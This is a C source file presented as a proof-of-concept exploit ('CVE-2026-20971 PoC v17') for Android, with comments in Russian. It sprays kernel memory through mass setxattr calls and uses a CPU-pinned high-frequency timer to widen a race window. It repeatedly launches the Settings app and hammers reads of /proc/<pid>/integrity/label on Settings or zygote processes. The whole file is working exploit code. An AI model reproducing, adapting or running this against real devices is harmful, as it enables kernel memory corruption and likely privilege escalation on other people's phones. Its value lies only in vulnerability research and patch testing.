#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <errno.h>
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <sched.h>
#include <stdbool.h>

bool pid_exists(int pid) {
    char path[32];
    snprintf(path, sizeof(path), "/proc/%d", pid);
    return access(path, F_OK) == 0;
}

int find_pid(const char *name) {
    DIR *dir = opendir("/proc");
    struct dirent *entry;
    int pid = -1;
    if (!dir) return -1;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            int id = atoi(entry->d_name);
            if (id > 0) {
                char path[256], cmdline[128];
                snprintf(path, sizeof(path), "/proc/%d/cmdline", id);
                int fd = open(path, O_RDONLY);
                if (fd >= 0) {
                    int n = read(fd, cmdline, sizeof(cmdline)-1);
                    close(fd);
                    if (n > 0) {
                        cmdline[n] = '\0';
                        if (strstr(cmdline, name) != NULL) {
                            pid = id;
                            break;
                        }
                    }
                }
            }
        }
    }
    closedir(dir);
    return pid;
}

void* spray_thread(void* arg) {
    char value[56]; 
    memset(value, 0xFF, sizeof(value)); 
    char path[64];
    snprintf(path, sizeof(path), "/data/local/tmp/spray_%d", gettid());
    int fd = open(path, O_CREAT | O_RDWR, 0600);
    if (fd >= 0) close(fd);
    long count = 0;
    while(1) {
        char name[64];
        snprintf(name, sizeof(name), "user.spray_%ld", count++);
        setxattr(path, name, value, sizeof(value), 0);
    }
    return NULL;
}

void* interrupter_thread(void* arg) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set); 
    sched_setaffinity(0, sizeof(set), &set);

    int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
    struct itimerspec its;
    its.it_value.tv_sec = 0;
    its.it_value.tv_nsec = 1000; 
    its.it_interval.tv_sec = 0;
    its.it_interval.tv_nsec = 1000;
    timerfd_settime(tfd, 0, &its, NULL);

    int epfd = epoll_create1(0);
    struct epoll_event ev, events[1];
    ev.events = EPOLLIN;
    ev.data.fd = tfd;
    epoll_ctl(epfd, EPOLL_CTL_ADD, tfd, &ev);

    while(1) {
        epoll_wait(epfd, events, 1, -1);
        uint64_t exp;
        read(tfd, &exp, sizeof(uint64_t));
    }
    return NULL;
}

void* trigger_thread(void* arg) {
    while(1) {
        system("am start -n com.android.settings/.Settings > /dev/null 2>&1");
        usleep(300000); // 300 мс (увеличили паузу)
    }
    return NULL;
}

void* reader_thread(void* arg) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set); 
    sched_setaffinity(0, sizeof(set), &set);

    char buf[256];
    long iter = 0;
    int cached_pid = -1;

    while(1) {
        // Если PID нет или процесс умер, ищем новый
        if (cached_pid == -1 || !pid_exists(cached_pid)) {
            cached_pid = find_pid("com.android.settings");
            if (cached_pid == -1) cached_pid = find_pid("app_process64");
            if (cached_pid == -1) cached_pid = find_pid("zygote64");
        }

        if (cached_pid != -1) {
            char path[64];
            snprintf(path, sizeof(path), "/proc/%d/integrity/label", cached_pid);
            
            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                read(fd, buf, sizeof(buf)); 
                close(fd);
                iter++;
                if (iter % 100 == 0) { // Выводим чаще
                    printf("[Reader] PID: %d Iter: %ld\n", cached_pid, iter);
                }
            } else {
                // Если open не удался (например, процесс умер между проверкой и open)
                cached_pid = -1; 
            }
        } else {
            usleep(1000);
        }
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    printf("[*] CVE-2026-20971 PoC v17 (Cached PID)\n");

    for (int i=0; i<8; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, spray_thread, NULL);
        pthread_detach(tid);
    }

    pthread_t int_tid;
    pthread_create(&int_tid, NULL, interrupter_thread, NULL);
    pthread_detach(int_tid);

    pthread_t trigger_tid;
    pthread_create(&trigger_tid, NULL, trigger_thread, NULL);
    pthread_detach(trigger_tid);

    // Один поток чтения, чтобы не создавать лишнюю конкуренцию за CPU
    pthread_t read_tid;
    pthread_create(&read_tid, NULL, reader_thread, NULL);
    pthread_detach(read_tid);

    while(1) sleep(10);
    return 0;
}